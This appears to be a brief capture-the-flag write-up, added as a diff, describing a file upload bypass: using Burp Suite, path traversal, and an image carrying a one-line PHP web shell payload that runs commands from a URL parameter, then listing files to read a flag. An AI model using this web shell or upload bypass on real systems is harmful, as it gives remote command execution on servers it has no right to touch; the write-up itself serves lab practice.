@@ -1,0 +1,6 @@
+1. open burpsuit
+2. upload image, here I can see the form in html and file in url with extension
+.php
+3. apply upload file .php I can't
+4. apply path transversal and upload file image with payload <?php echo system($_GET['command']); ?>
+5. apply ls and cat index.php and I observed flag.
